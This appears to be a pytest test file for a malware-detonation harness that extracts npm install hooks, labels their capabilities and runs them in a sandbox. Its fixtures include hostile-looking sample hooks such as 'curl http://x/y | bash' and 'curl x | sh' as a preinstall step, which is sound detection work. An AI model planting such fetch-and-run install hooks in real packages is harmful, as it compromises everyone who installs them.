from __future__ import annotations

import json
import sys

import pytest

from phylax.harness import detonate


def _write(tmp_path, scripts):
    (tmp_path / "package.json").write_text(
        json.dumps({"name": "victim", "version": "1.0.0", "scripts": scripts}),
        encoding="utf-8",
    )
    return tmp_path


class TestScriptExtraction:
    def test_lifecycle_hooks_are_found(self, tmp_path):
        _write(tmp_path, {"postinstall": "node grab.js", "test": "jest"})
        found = detonate.npm_scripts(tmp_path)
        assert found == {"postinstall": "node grab.js"}

    def test_a_package_without_scripts_yields_nothing(self, tmp_path):
        _write(tmp_path, {})
        assert detonate.npm_scripts(tmp_path) == {}

    def test_a_malformed_manifest_does_not_raise(self, tmp_path):
        (tmp_path / "package.json").write_text("{not json", encoding="utf-8")
        assert detonate.npm_scripts(tmp_path) == {}

    def test_a_missing_manifest_yields_nothing(self, tmp_path):
        assert detonate.npm_scripts(tmp_path) == {}


class TestHookCapabilities:
    def test_postinstall_is_named_specifically(self):
        caps = detonate.hook_capabilities("postinstall", "node x.js", False, False)
        assert "POSTINSTALL_SCRIPT" in caps
        assert "INSTALL_HOOK_EXEC" in caps

    def test_a_piped_download_is_shell_execution(self):
        caps = detonate.hook_capabilities(
            "preinstall", "curl http://x/y | bash", False, False
        )
        assert "EXEC_SHELL" in caps
        assert "CREATE_PROCESS" in caps

    def test_writing_files_is_recorded(self):
        caps = detonate.hook_capabilities("install", "node b.js", True, False)
        assert "WRITE_FILE" in caps

    def test_removing_files_is_recorded(self):
        caps = detonate.hook_capabilities("install", "node b.js", False, True)
        assert "DELETE_FILE" in caps

    def test_every_name_is_canonical_for_the_packages_track(self):
        from phylax.analysis import capability

        emitted = set()
        for hook in ("preinstall", "install", "postinstall"):
            emitted |= detonate.hook_capabilities(hook, "curl x | sh", True, True)
        for name in emitted:
            assert capability.is_valid_for("packages", name), name


@pytest.mark.skipif(sys.platform == "win32", reason="hook execution is posix shell")
class TestHookExecution:
    def test_a_hook_that_writes_a_file_is_observed(self, tmp_path):
        _write(tmp_path, {"postinstall": "echo pwned > dropped.txt"})
        result = detonate._detonate_npm(tmp_path, timeout_s=10)

        phase = result["phases"]["npm_postinstall"]
        assert "dropped.txt" in phase["created"]
        assert "WRITE_FILE" in result["capabilities"]

    def test_a_hanging_hook_is_timed_out_rather_than_blocking(self, tmp_path):
        _write(tmp_path, {"postinstall": "sleep 30"})
        result = detonate._detonate_npm(tmp_path, timeout_s=2)

        assert result["phases"]["npm_postinstall"]["timed_out"] is True

    def test_a_failing_hook_still_reports_its_command(self, tmp_path):
        _write(tmp_path, {"preinstall": "exit 3"})
        result = detonate._detonate_npm(tmp_path, timeout_s=10)

        phase = result["phases"]["npm_preinstall"]
        assert phase["exit_code"] == 3
        assert phase["command"] == "exit 3"
